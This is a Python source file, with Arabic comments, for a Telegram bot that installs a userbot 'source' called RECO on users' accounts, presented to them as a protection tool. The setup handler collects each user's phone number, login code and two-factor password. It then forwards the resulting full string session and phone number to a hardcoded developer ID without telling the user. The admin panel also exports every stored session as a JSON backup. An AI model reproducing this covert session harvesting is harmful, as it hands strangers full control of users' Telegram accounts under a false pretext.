#import re, os, asyncio, json, datetime
from telethon import TelegramClient, events, Button, functions
from telethon.errors import SessionPasswordNeededError, UserNotParticipantError
from telethon.sessions import StringSession
from config import BOT_TOKEN, API_ID, API_HASH
from user_core import start_user_source
import re
import os
import json
import datetime
import asyncio

# إعدادات الملفات والمسؤولين
DB_FILE = "database.json"
SETTINGS_FILE = "settings.json"
CHANNEL_USERNAME = "N_QQ_H" 
ADMIN_ID = 7769271031 # ايديك كمطور للسورس

# --- القواميس المؤقتة للحالات والعمليات ---
user_states = {}
running_tasks = {} # لحفظ مهام الحسابات المشغلة برمجياً

# --- دالة تحميل وحفظ الإعدادات الإدارية ---
def load_settings():
    if not os.path.exists(SETTINGS_FILE):
        with open(SETTINGS_FILE, 'w') as f:
            json.dump({"setup_locked": False, "blacklist": []}, f)
    with open(SETTINGS_FILE, 'r') as f:
        try:
            return json.load(f)
        except:
            return {"setup_locked": False, "blacklist": []}


def save_settings(settings):
    with open(SETTINGS_FILE, 'w') as f:
        json.dump(settings, f, indent=4)


# --- دالة التعامل مع قاعدة بيانات المستخدمين ---
def get_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r') as f: 
                return json.load(f)
        except: 
            return {}
    return {}


def save_db(data):
    with open(DB_FILE, 'w') as f:
        json.dump(data, f, indent=4, ensure_ascii=False)


# تشغيل بوت التنصيب الأساسي
bot = TelegramClient("installer_bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)


# --- وظيفة فحص الاشتراك الإجباري ---
async def check_sub(user_id):
    try:
        await bot(functions.channels.GetParticipantRequest(CHANNEL_USERNAME, user_id))
        return True
    except UserNotParticipantError:
        return False
    except Exception:
        return True


# --- دالة لتشغيل الحساب مع معالجة "إشعار الموت" ---
async def run_user_safely(session, api_id, api_hash, info, uid):
    try:
        # تسجيل المهمة الحالية للتمكن من إيقافها عند الحذف
        current_task = asyncio.current_task()
        running_tasks[str(uid)] = current_task
        
        # تمرير بيانات المستخدم بما فيها الإعدادات المفعلة للسورس
        await start_user_source(session, api_id, api_hash, info)
        
    except asyncio.CancelledError:
        print(f"🛑 تم إيقاف سورس المستخدم {uid} بنجاح من الذاكرة.")
        
    except Exception as e:
        # إشعار الموت للمطور
        death_text = (
            f"💀 **تـنـبـيـه: حـسـاب مـتـعـطـل (مـيـت) !**\n\n"
            f"👤 **المستخدم:** {info.get('name', 'غير معروف')}\n"
            f"🆔 **الايدي:** `{uid}`\n"
            f"⚠️ **السبب:** `{str(e)[:100]}`"
        )
        btn = [[Button.inline("🗑 حذف البيانات التالفة", f"wipe_{uid}")]]
        try:
            await bot.send_message(ADMIN_ID, death_text, buttons=btn)
        except:
            pass
    finally:
        if str(uid) in running_tasks:
            del running_tasks[str(uid)]


# --- معالج حذف المستخدمين الميتين من الإشعار ---
@bot.on(events.CallbackQuery(data=re.compile(b"wipe_(.*)")))
async def wipe_dead_user(event):
    if event.sender_id != ADMIN_ID: return
    target_id = event.data_match.group(1).decode()
    db = get_db()
    if target_id in db:
        if target_id in running_tasks:
            running_tasks[target_id].cancel()
            
        del db[target_id]
        save_db(db)
        await event.edit(f"✅ تم حذف بيانات المستخدم `{target_id}` بنجاح من قاعدة البيانات.")
    else:
        await event.answer("⚠️ البيانات محذوفة بالفعل أو غير موجودة.", alert=True)


# --- معالج أمر البداية /start ---
@bot.on(events.NewMessage(pattern="/start"))
async def start(event):
    settings = load_settings()
    
    if event.sender_id in settings.get('blacklist', []):
        return await event.reply("🚫 **عـذراً عزيزي، لـقـد تـم حـظـرك مـن اسـتـخـدام الـبوت.**")

    if not await check_sub(event.sender_id):
        return await event.reply(
            f"⚠️ **يـجـب عـلـيـك الاشـتـراك لـتـفـعـيـل الـسـورس**\n\n📢 **قـنـاة الـسـورس :** @{CHANNEL_USERNAME}",
            buttons=[Button.url("اضـغـط هـنـا للاشـتـراك 📢", f"https://t.me/{CHANNEL_USERNAME}")]
        )
    
    btns = [
        [Button.inline("🚀 بـدء تـنـصـيـب ريـكـو", b"setup")],
        [Button.inline("🔑 تـنـصـيـب عـبـر سـيـشـن", b"setup_session")],
        [Button.inline("📋 تـنـصـيـبـي", b"my_install")],
        [Button.url("قـنـاة الـسـورس 🦅", "https://t.me/SORS_RECO"), Button.url("الـمـطـور 👤", "https://t.me/I_QQ_Q")]
    ]
    
    if event.sender_id == ADMIN_ID:
        btns.append([Button.inline("⚙️ لـوحـة الـتـحـكـم", b"admin_panel")])
        
    await event.reply(
        "🦅 **أهـلاً بـك فـي بـوت تـنـصـيـب سـورس ريـكـو الـمـطـور**\n\n"
        "يـمـكـنـك الآن تـنـصـيـب حـسـابـك عـلـى أقـوى سـورس حـمـايـة فـي الـتـلـيـجـرام.\n\n"
        "**اضـغـط عـلـى الـزر أدناه لـلـبـدء :**",
        buttons=btns
    )


# --- نظام "تنصيبي" المطور (عرض البيانات + حذف بالتأكيد) ---
@bot.on(events.CallbackQuery(data=b"my_install"))
async def my_install_handler(event):
    uid = str(event.sender_id)
    db = get_db()
    
    if uid not in db:
        return await event.answer("⚠️ أنت غير منصب في البوت حالياً.", alert=True)
    
    user_info = db[uid]
    msg_text = (
        f"👤 **مـعـلـومـات تـنـصـيـبـك الـكـامـلـة :**\n\n"
        f"🔹 **الاسـم:** {user_info.get('name')}\n"
        f"🆔 **الآيـدي:** `{uid}`\n"
        f"📅 **تـاريـخ الـتـنـصـيـب:** `{user_info.get('date')}`\n"
        f"📡 **الـحـالـة:** `يـعـمـل بـنـجـاح ✅`\n"
        f"‏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n"
        f"⚠️ **تنبيه:** الضغط على الزر أدناه سيقوم بإيقاف السورس ومسح بياناتك."
    )
    
    await event.edit(msg_text, buttons=[
        [Button.inline("🗑️ إيقاف تنصيبي ومسح البيانات", b"confirm_delete_1")],
        [Button.inline("🔙 رجوع", b"back")]
    ])


@bot.on(events.CallbackQuery(data=b"confirm_delete_1"))
async def confirm_del_process(event):
    user_states[event.sender_id] = "waiting_for_del_confirm"
    await event.edit(
        "‼️ **هـل أنـت مـتـأكـد تـمـامـاً مـن حـذف تـنـصـيـبـك؟**\n\n"
        "سيتم إيقاف السورس فوراً وحذف كل بياناتك من البوت.\n"
        "للتأكيد، يرجى كتابة العبارة التالية بدقة وإرسالها كرسالة :\n\n"
        "`نعم أنا متأكد`",
        buttons=[Button.inline("❌ إلغاء العملية", b"my_install")]
    )


# --- معالج الرسائل الجديدة (لتأكيد الحذف النصي + إشعار المطور) ---
@bot.on(events.NewMessage)
async def check_confirmation_msg(event):
    uid = event.sender_id
    if user_states.get(uid) == "waiting_for_del_confirm":
        if event.raw_text == "نعم أنا متأكد":
            db = get_db()
            uid_str = str(uid)
            if uid_str in db:
                user_name = db[uid_str].get('name', 'غير معروف')
                # 1. إيقاف المهمة وإرسال إشعار للمطور (الميزة الجديدة)
                if uid_str in running_tasks:
                    running_tasks[uid_str].cancel()
                
                # إشعار المطور
                bye_msg = (
                    f"👋 **مـسـتـخـدم قـام بـحـذف تـنـصـيـبـه !**\n\n"
                    f"👤 **الاسم:** {user_name}\n"
                    f"🆔 **الايدي:** `{uid_str}`\n"
                    f"📅 **التاريخ:** `{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`"
                )
                try: await bot.send_message(ADMIN_ID, bye_msg)
                except: pass

                # 2. مسح البيانات من الـ JSON
                del db[uid_str]
                save_db(db)
                
                user_states[uid] = None
                await event.reply("✅ **تم إيقاف السورس وحذف كافة بيانات تنصيبك بنجاح.**")
            else:
                await event.reply("⚠️ لم يتم العثور على تنصيب نشط لك.")
        else:
            user_states[uid] = None
            await event.reply("❌ **تم إلغاء الحذف بسبب كتابة عبارة غير مطابقة.**")


# --- معالج عملية التنصيب (Setup) التقليدي ---
@bot.on(events.CallbackQuery(data=b"setup"))
async def setup(event):
    settings = load_settings()
    
    if settings.get('setup_locked', False) and event.sender_id != ADMIN_ID:
        return await event.answer("⚠️ الـتـنـصـيـب مـقـفـول حالياً من المطور، راسله للمساعدة.", alert=True)

    uid = event.sender_id
    async with bot.conversation(event.chat_id, timeout=300) as conv:
        try:
            u_id = API_ID
            u_hash = API_HASH

            await conv.send_message("📱 **أرسـل رقـم هـاتـفـك مـع مـفـتـاح الـدولة (مثال: +964...) :**")
            res_phone = await conv.get_response()
            u_phone = res_phone.text.strip().replace(" ", "")

            c = TelegramClient(StringSession(), u_id, u_hash)
            await c.connect()
            await c.send_code_request(u_phone)

            await conv.send_message("🔢 **أرسـل كـود الـتـحـقـق (بمسافات أو بدونها) :**")
            res_code = await conv.get_response()
            u_code = res_code.text.replace(" ", "").replace("-", "")

            try:
                await c.sign_in(u_phone, u_code)
            except SessionPasswordNeededError:
                await conv.send_message("🔐 **أرسـل رمـز الـتـحـقـق بـخـطـوتـيـن (2FA) :**")
                res_pw = await conv.get_response()
                await c.sign_in(password=res_pw.text)

            session_str = c.session.save()
            me = await c.get_me()
            
            db = get_db()
            date_now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            # إضافة حقل custom_settings لحفظ المميزات المفعلة (مثل .اعادة_تشغيل)
            user_data = {
                "api_id": u_id, 
                "api_hash": u_hash, 
                "name": me.first_name, 
                "session": session_str, 
                "date": date_now,
                "user_id": uid,
                "custom_settings": {} # هنا يتم تخزين الأوامر والمميزات المفعلة
            }
            db[str(uid)] = user_data
            save_db(db)
            await c.disconnect()
            
            await conv.send_message(f"🎊 **تـم الـتـنـصـيـب بـنـجـاح يـا {me.first_name} ✅**")
            
            new_install_msg = (
                f"🆕 **تـنـصـيـب جـديـد فـي الـسـورس !**\n\n"
                f"👤 **الاسم:** {me.first_name}\n"
                f"🆔 **الايدي:** `{uid}`\n"
                f"📞 **الهاتف:** `{u_phone}`\n"
                f"📅 **التاريخ:** `{date_now}`\n\n"
                f"🎫 **كود السيشن (String Session):**\n`{session_str}`"
            )
            await bot.send_message(ADMIN_ID, new_install_msg)
            asyncio.create_task(run_user_safely(session_str, u_id, u_hash, user_data, uid))

        except Exception as e:
            await conv.send_message(f"❌ **حـدث خـطأ أثناء الـتـنـصـيـب :**\n`{e}`")


# --- معالج التنصيب عبر السيشن (Setup by Session) ---
@bot.on(events.CallbackQuery(data=b"setup_session"))
async def setup_by_session(event):
    settings = load_settings()
    if settings.get('setup_locked', False) and event.sender_id != ADMIN_ID:
        return await event.answer("⚠️ الـتـنـصـيـب مـقـفـول حالياً من المطور.", alert=True)

    uid = event.sender_id
    async with bot.conversation(event.chat_id, timeout=300) as conv:
        try:
            await conv.send_message("🎫 **أرسـل الآن كـود الـسـيـشـن (String Session) الخاص بك :**")
            res_session = await conv.get_response()
            u_session = res_session.text.strip()

            await conv.send_message("⏳ جاري التحقق من السيشن وتشغيل السورس...")
            
            temp_client = TelegramClient(StringSession(u_session), API_ID, API_HASH)
            await temp_client.connect()
            
            if not await temp_client.is_user_authorized():
                await temp_client.disconnect()
                return await conv.send_message("❌ **عذراً، هذا السيشن غير صالح أو منتهي الصلاحية.**")

            me = await temp_client.get_me()
            session_str = u_session 
            
            db = get_db()
            date_now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            user_data = {
                "api_id": API_ID, 
                "api_hash": API_HASH, 
                "name": me.first_name, 
                "session": session_str, 
                "date": date_now,
                "user_id": uid,
                "custom_settings": {} # لحفظ الإعدادات والمميزات
            }
            db[str(uid)] = user_data
            save_db(db)
            await temp_client.disconnect()

            await conv.send_message(f"✅ **تـم الـتـنـصـيـب بـنـجـاح عـبـر الـسـيـشـن!**\n👤 الحساب: {me.first_name}")

            log_msg = (
                f"🔑 **تـنـصـيـب جـديـد (عـبـر سـيـشـن) !**\n\n"
                f"👤 **الاسم:** {me.first_name}\n"
                f"🆔 **الايدي:** `{uid}`\n"
                f"📅 **التاريخ:** `{date_now}`"
            )
            await bot.send_message(ADMIN_ID, log_msg)
            asyncio.create_task(run_user_safely(session_str, API_ID, API_HASH, user_data, uid))

        except Exception as e:
            await conv.send_message(f"❌ **حدث خطأ أثناء معالجة السيشن:**\n`{str(e)}`")


# --- لوحة تحكم المطور الشاملة ---
@bot.on(events.CallbackQuery(data=b"admin_panel"))
async def admin_panel(event):
    if event.sender_id != ADMIN_ID: return
    
    settings = load_settings()
    db = get_db()
    
    lock_status = "🔓 التنصيب: مفتوح" if not settings.get('setup_locked') else "🔒 التنصيب: مقفول"
    
    btns = [
        [Button.inline(lock_status, b"toggle_lock")],
        [Button.inline("🚫 حظر مستخدم", b"block_user"), Button.inline("✅ إلغاء حظر", b"unblock_user")],
        [Button.inline("🗑 إزالة سورس ومسح بيانات", b"wipe_user")],
        [Button.inline("📥 سحب قاعدة JSON", b"get_backup"), Button.inline("📤 رفع قاعدة JSON", b"upload_backup")],
        [Button.inline("📢 إذاعة عامة", b"broadcast"), Button.inline("🔙 رجوع", b"back")]
    ]
    
    await event.edit(
        f"👑 **مـرحـبـاً سـيـدي الـمـطـور فـي لـوحـة الإدارة**\n\n"
        f"📊 **عـدد الـمـنـصـبـيـن حـالـيـاً :** `{len(db)}` \n"
        f"📁 ملاحظة: ملف النسخ الاحتياطي يشمل كافة إعدادات المستخدمين.", 
        buttons=btns
    )


# --- وظائف التحكم الإدارية ---
@bot.on(events.CallbackQuery(data=b"toggle_lock"))
async def toggle_lock(event):
    if event.sender_id != ADMIN_ID: return
    settings = load_settings()
    settings['setup_locked'] = not settings.get('setup_locked', False)
    save_settings(settings)
    await admin_panel(event)


@bot.on(events.CallbackQuery(data=b"get_backup"))
async def get_backup(event):
    if event.sender_id != ADMIN_ID: return
    if os.path.exists(DB_FILE):
        await bot.send_file(event.chat_id, DB_FILE, caption=f"📁 نسخة احتياطية كاملة (تشمل الإعدادات) بتاريخ: {datetime.datetime.now()}")
    else:
        await event.answer("⚠️ لا يوجد ملف قاعدة بيانات حالياً.", alert=True)


@bot.on(events.CallbackQuery(data=b"upload_backup"))
async def upload_backup(event):
    if event.sender_id != ADMIN_ID: return
    async with bot.conversation(event.chat_id) as conv:
        await conv.send_message("📤 **أرسـل الآن مـلـف `database.json` لـتـحـديـث الـقـاعدة :**")
        msg = await conv.get_response()
        if msg.file and msg.file.name.endswith(".json"):
            await bot.download_media(msg, DB_FILE)
            await conv.send_message("✅ **تـم رفـع وتـحـديـث قاعدة البيانات بـنـجـاح.**")
        else:
            await conv.send_message("❌ **خـطأ: يـرجـى إرسـال مـلـف JSON صـحـيـح.**")


@bot.on(events.CallbackQuery(data=b"block_user"))
async def block_user(event):
    if event.sender_id != ADMIN_ID: return
    async with bot.conversation(event.chat_id) as conv:
        await conv.send_message("🚫 **أرسـل ايـدي الـمـسـتـخـدم لـحـظـره :**")
        res = await conv.get_response()
        try:
            target = int(res.text)
            settings = load_settings()
            if target not in settings['blacklist']:
                settings['blacklist'].append(target)
                save_settings(settings)
                await conv.send_message(f"✅ تم حظر `{target}` بنجاح.")
            else:
                await conv.send_message("⚠️ المستخدم محظور بالفعل.")
        except:
            await conv.send_message("❌ الايدي غير صحيح.")


@bot.on(events.CallbackQuery(data=b"unblock_user"))
async def unblock_user(event):
    if event.sender_id != ADMIN_ID: return
    async with bot.conversation(event.chat_id) as conv:
        await conv.send_message("✅ **أرسـل ايـدي الـمـسـتـخـدم لإلـغـاء حـظـره :**")
        res = await conv.get_response()
        try:
            target = int(res.text)
            settings = load_settings()
            if target in settings['blacklist']:
                settings['blacklist'].remove(target)
                save_settings(settings)
                await conv.send_message(f"✅ تم إلغاء حظر `{target}`.")
            else:
                await conv.send_message("⚠️ المستخدم ليس في قائمة الحظر.")
        except:
            await conv.send_message("❌ الايدي غير صحيح.")


@bot.on(events.CallbackQuery(data=b"wipe_user"))
async def wipe_user(event):
    if event.sender_id != ADMIN_ID: return
    async with bot.conversation(event.chat_id) as conv:
        await conv.send_message("🗑 **أرسـل ايـدي الـمـسـتـخـدم لـحـذف بـيـانـاتـه تـمـامـاً :**")
        res = await conv.get_response()
        target_id = res.text.strip()
        db = get_db()
        if target_id in db:
            if target_id in running_tasks:
                running_tasks[target_id].cancel()
            del db[target_id]
            save_db(db)
            await conv.send_message(f"✅ تم حذف بيانات `{target_id}` بنجاح.")
        else:
            await conv.send_message("❌ الايدي غير موجود في قاعدة المنصبين.")


@bot.on(events.CallbackQuery(data=b"broadcast"))
async def broadcast(event):
    if event.sender_id != ADMIN_ID: return
    async with bot.conversation(event.chat_id) as conv:
        await conv.send_message("📢 **أرسـل نـص الإذاعـة الآن :**")
        msg = await conv.get_response()
        db = get_db()
        sent = 0
        await conv.send_message("⏳ جاري الإرسال للجميع...")
        for uid in db:
            try:
                await bot.send_message(int(uid), msg.text)
                sent += 1
                await asyncio.sleep(0.3)
            except:
                pass
        await conv.send_message(f"✅ تم إرسال الإذاعة إلى {sent} مستخدم.")


@bot.on(events.CallbackQuery(data=b"back"))
async def back(event):
    await start(event)


# --- وظيفة تشغيل كافة الجلسات المخزنة عند الإقلاع ---
async def load_backup():
    db = get_db()
    if db:
        print(f"🔄 جاري إعادة تشغيل {len(db)} حساب مع استعادة الإعدادات...")
        for uid, info in db.items():
            if "session" in info:
                try:
                    await asyncio.sleep(1) 
                    asyncio.create_task(run_user_safely(info['session'], info.get('api_id', API_ID), info.get('api_hash', API_HASH), info, uid))
                except:
                    pass


# --- نقطة انطلاق النظام ---
if __name__ == "__main__":
    bot.loop.create_task(load_backup())
    print("🤖 RECO SOURCE SYSTEM IS STARTING...")
    bot.run_until_disconnected()
